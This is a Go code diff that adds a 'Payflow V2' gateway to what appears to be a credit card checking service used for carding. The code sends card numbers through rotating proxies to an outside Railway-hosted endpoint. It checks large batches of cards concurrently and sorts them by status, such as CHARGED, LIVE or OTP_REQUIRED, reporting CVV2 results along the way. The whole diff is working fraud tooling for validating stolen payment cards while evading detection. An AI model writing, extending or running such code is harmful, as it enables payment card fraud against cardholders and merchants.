@@ -1300,14 +1300,114 @@ func doCheck(client *http.Client, sacAPI string, card Card, site string, proxyRa
 	}
 }
 
-func checkCard(client *http.Client, sacAPI string, card Card, sites []string, proxies []string) CheckResult {
+func doCheckPayflow(client *http.Client, card Card, proxyRaw string) CheckResult {
+	cc := card.Formatted
+	proxyConverted := formatProxyForAPI(proxyRaw)
+
+	urlStr := fmt.Sprintf("https://payflow-v2-production-5485.up.railway.app/mlsn?cc=%s", url.QueryEscape(cc))
+	if proxyConverted != "" {
+		urlStr += fmt.Sprintf("&proxy=%s", url.QueryEscape(proxyConverted))
+	}
+
+	req, err := http.NewRequest("GET", urlStr, nil)
+	if err != nil {
+		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+			return CheckResult{Status: "TIMEOUT", Msg: "Request Timeout (90s)", Emoji: "⏰", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
+		}
+		return CheckResult{Status: "EXCEPTION", Msg: err.Error(), Emoji: "🔥", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
+	}
+	defer resp.Body.Close()
+
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
+	}
+
+	var raw map[string]interface{}
+	if err := json.Unmarshal(bodyBytes, &raw); err != nil {
+		text := string(bodyBytes)
+		text = regexp.MustCompile(`<[^>]+>`).ReplaceAllString(text, "")
+		text = strings.TrimSpace(text)
+		if len(text) > 200 {
+			text = text[:200]
+		}
+		return CheckResult{Status: "ERROR", Msg: text, Emoji: "⚠️", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
+	}
+
+	getString := func(m map[string]interface{}, keys ...string) string {
+		for _, k := range keys {
+			if val, ok := m[k]; ok && val != nil {
+				return fmt.Sprintf("%v", val)
+			}
+		}
+		return ""
+	}
+
+	apiResponse := getString(raw, "Response", "response", "message", "Message")
+	cvv2 := getString(raw, "CVV2", "cvv2")
+	procCvv2 := getString(raw, "PROCCVV2", "proccvv2")
+	orderID := getString(raw, "ORDERID", "orderid")
+	checkTime := getString(raw, "Time", "time", "elapsed")
+	gatewayVal := getString(raw, "Gateway", "gateway", "Gate")
+	if gatewayVal == "" {
+		gatewayVal = "Payflow V2"
+	}
+
+	status, emoji := classifyResponse(apiResponse)
+
+	if status == "UNKNOWN" && apiResponse != "" {
+		apiStatus := getString(raw, "Status", "status")
+		if apiStatus == "false" || apiStatus == "False" {
+			status = "ERROR"
+			emoji = "⚠️"
+		}
+	}
+
+	var msgParts []string
+	if apiResponse != "" {
+		msgParts = append(msgParts, apiResponse)
+	}
+	if cvv2 != "" {
+		msgParts = append(msgParts, "CVV2: "+cvv2)
+	}
+	if procCvv2 != "" {
+		msgParts = append(msgParts, "PROCCVV2: "+procCvv2)
+	}
+	if orderID != "" {
+		msgParts = append(msgParts, "ORDERID: "+orderID)
+	}
+	finalMsg := strings.Join(msgParts, " | ")
+
+	return CheckResult{
+		Status:    status,
+		Msg:       finalMsg,
+		Emoji:     emoji,
+		Price:     "-",
+		Gateway:   gatewayVal,
+		Site:      "payflow",
+		ReceiptID: "N/A",
+		Time:      checkTime,
+	}
+}
+
+func checkCard(client *http.Client, sacAPI string, card Card, sites []string, proxies []string, gateway string) CheckResult {
 	var lastResult CheckResult
 	for attempt := 0; attempt < 5; attempt++ {
 		site := pickRandomSite(sites)
 		proxy := GetProxyManager().PickProxy(proxies)
 		
 		start := time.Now()
-		result := doCheck(client, sacAPI, card, site, proxy)
+		var result CheckResult
+		if gateway == "payflow" {
+			result = doCheckPayflow(client, card, proxy)
+		} else {
+			result = doCheck(client, sacAPI, card, site, proxy)
+		}
 		latency := time.Since(start)
 		lastResult = result
 
@@ -1337,7 +1437,7 @@ func checkCard(client *http.Client, sacAPI string, card Card, sites []string, pr
 	return lastResult
 }
 
-func checkCardsBatch(client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int) []CheckResult {
+func checkCardsBatch(client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int, gateway string) []CheckResult {
 	if concurrency <= 0 {
 		concurrency = 1000
 	}
@@ -1352,7 +1452,7 @@ func checkCardsBatch(client *http.Client, sacAPI string, cards []Card, sites []s
 			sem <- struct{}{}
 			defer func() { <-sem }()
 
-			res := checkCard(client, sacAPI, c, sites, proxies)
+			res := checkCard(client, sacAPI, c, sites, proxies, gateway)
 			res.Card = c.Formatted
 
 			if res.Status == "CHARGED" || res.Status == "LIVE" || res.Status == "OTP_REQUIRED" || res.Status == "LOW_BALANCE" {
@@ -1842,6 +1942,7 @@ func apiCheckBatchHandler(w http.ResponseWriter, r *http.Request) {
 		Proxies     []string    `json:"proxies"`
 		Concurrency interface{} `json:"concurrency"`
 		Semaphore   interface{} `json:"semaphore"`
+		Gateway     string      `json:"gateway"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
@@ -1875,6 +1976,22 @@ func apiCheckBatchHandler(w http.ResponseWriter, r *http.Request) {
 	if len(proxies) == 0 {
 		proxies = getProxies(userID, isAdmin)
 	}
+
+	if reqData.Gateway == "payflow" {
+		if len(reqData.Cards) > 1 {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn, không hỗ trợ check hàng loạt!"})
+			return
+		}
+		if len(proxies) == 0 {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 bắt buộc phải có proxy mới được check!"})
+			return
+		}
+	}
+
 	client := &http.Client{
 		Timeout: 90 * time.Second,
 	}
@@ -1883,13 +2000,13 @@ func apiCheckBatchHandler(w http.ResponseWriter, r *http.Request) {
 		sacAPI = "https://thorough-fascination-production-725d.up.railway.app"
 	}
 
-	results := checkCardsBatch(client, sacAPI, reqData.Cards, sites, proxies, concurrency)
+	results := checkCardsBatch(client, sacAPI, reqData.Cards, sites, proxies, concurrency, reqData.Gateway)
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{"results": results})
 }
 
-func handleCheckSSE(w http.ResponseWriter, r *http.Request, cards []Card, sites []string, proxies []string, concurrency int) {
+func handleCheckSSE(w http.ResponseWriter, r *http.Request, cards []Card, sites []string, proxies []string, concurrency int, gateway string) {
 	w.Header().Set("Content-Type", "text/event-stream")
 	w.Header().Set("Cache-Control", "no-cache")
 	w.Header().Set("Connection", "keep-alive")
@@ -1919,7 +2036,7 @@ func handleCheckSSE(w http.ResponseWriter, r *http.Request, cards []Card, sites 
 			end = totalCards
 		}
 		batch := cards[i:end]
-		batchResults := checkCardsBatch(client, sacAPI, batch, sites, proxies, concurrency)
+		batchResults := checkCardsBatch(client, sacAPI, batch, sites, proxies, concurrency, gateway)
 		allResults = append(allResults, batchResults...)
 
 		stats := map[string]int{
@@ -2007,6 +2124,7 @@ func apiCheckHandler(w http.ResponseWriter, r *http.Request) {
 		Proxies     []string    `json:"proxies"`
 		Concurrency interface{} `json:"concurrency"`
 		Semaphore   interface{} `json:"semaphore"`
+		Gateway     string      `json:"gateway"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
@@ -2049,6 +2167,21 @@ func apiCheckHandler(w http.ResponseWriter, r *http.Request) {
 		proxies = getProxies(userID, isAdmin)
 	}
 
+	if reqData.Gateway == "payflow" {
+		if len(cards) > 1 {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn, không hỗ trợ check hàng loạt!"})
+			return
+		}
+		if len(proxies) == 0 {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 bắt buộc phải có proxy mới được check!"})
+			return
+		}
+	}
+
 	if !isAdmin && len(cards) > 20000 {
 		w.Header().Set("Content-Type", "application/json")
 		w.WriteHeader(http.StatusBadRequest)
@@ -2074,11 +2207,20 @@ func apiCheckHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	handleCheckSSE(w, r, cards, sites, proxies, concurrency)
+	handleCheckSSE(w, r, cards, sites, proxies, concurrency, reqData.Gateway)
 }
 
 func apiCheckUploadHandler(w http.ResponseWriter, r *http.Request) {
 	r.ParseMultipartForm(200 << 20)
+	
+	gateway := r.FormValue("gateway")
+	if gateway == "payflow" {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn và không cho phép upload file / check hàng loạt!"})
+		return
+	}
+
 	file, _, err := r.FormFile("file")
 	if err != nil {
 		w.Header().Set("Content-Type", "application/json")
@@ -2177,7 +2319,7 @@ func apiCheckUploadHandler(w http.ResponseWriter, r *http.Request) {
 	if userID == 6071715158 {
 		isAdmin = true
 	}
-	go runTask(taskID, userID, cards, sites, proxies, concurrency, isAdmin)
+	go runTask(taskID, userID, cards, sites, proxies, concurrency, isAdmin, gateway)
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{
@@ -2810,7 +2952,7 @@ func generateCategoryFile(taskID int, category string, results []CheckResult) (s
 	return filePath, nil
 }
 
-func checkCardsBatchCtx(ctx context.Context, client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int, onCardChecked func(index int, res CheckResult)) []CheckResult {
+func checkCardsBatchCtx(ctx context.Context, client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int, gateway string, onCardChecked func(index int, res CheckResult)) []CheckResult {
 	if concurrency <= 0 {
 		concurrency = 1000
 	}
@@ -2847,7 +2989,7 @@ func checkCardsBatchCtx(ctx context.Context, client *http.Client, sacAPI string,
 				defer func() { <-sem }()
 			}
 
-			res := checkCard(client, sacAPI, c, sites, proxies)
+			res := checkCard(client, sacAPI, c, sites, proxies, gateway)
 			res.Card = c.Formatted
 
 			if res.Status == "CHARGED" || res.Status == "LIVE" || res.Status == "OTP_REQUIRED" || res.Status == "LOW_BALANCE" {
@@ -2985,7 +3127,7 @@ func getCleanSiteName(siteURL string) string {
 	return result
 }
 
-func runTask(taskID int, userID int64, cards []Card, sites []string, proxies []string, concurrency int, isAdmin bool) {
+func runTask(taskID int, userID int64, cards []Card, sites []string, proxies []string, concurrency int, isAdmin bool, gateway string) {
 	ctx, cancel := context.WithCancel(context.Background())
 	activeTasksMu.Lock()
 	activeTasks[taskID] = cancel
@@ -3057,7 +3199,7 @@ func runTask(taskID int, userID int64, cards []Card, sites []string, proxies []s
 		})
 	}
 
-	finalResults := checkCardsBatchCtx(ctx, client, sacAPI, cards, sites, proxies, concurrency, onCardChecked)
+	finalResults := checkCardsBatchCtx(ctx, client, sacAPI, cards, sites, proxies, concurrency, gateway, onCardChecked)
 
 	updateTicker.Stop()
 	dbUpdatedChan <- true
@@ -3160,6 +3302,7 @@ func apiCheckStartHandler(w http.ResponseWriter, r *http.Request) {
 		Proxies     []string    `json:"proxies"`
 		Concurrency interface{} `json:"concurrency"`
 		Semaphore   interface{} `json:"semaphore"`
+		Gateway     string      `json:"gateway"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
@@ -3200,6 +3343,21 @@ func apiCheckStartHandler(w http.ResponseWriter, r *http.Request) {
 	proxies := reqData.Proxies
 	if len(proxies) == 0 {
 		proxies = getProxies(userID, isAdmin)
+	}
+
+	if reqData.Gateway == "payflow" {
+		if len(cards) > 1 {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn, không hỗ trợ check hàng loạt!"})
+			return
+		}
+		if len(proxies) == 0 {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 bắt buộc phải có proxy mới được check!"})
+			return
+		}
 	}
 
 	if db == nil {
@@ -3267,7 +3425,7 @@ func apiCheckStartHandler(w http.ResponseWriter, r *http.Request) {
 	if userID == 6071715158 {
 		isAdmin = true
 	}
-	go runTask(taskID, userID, cards, sites, proxies, concurrency, isAdmin)
+	go runTask(taskID, userID, cards, sites, proxies, concurrency, isAdmin, reqData.Gateway)
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{
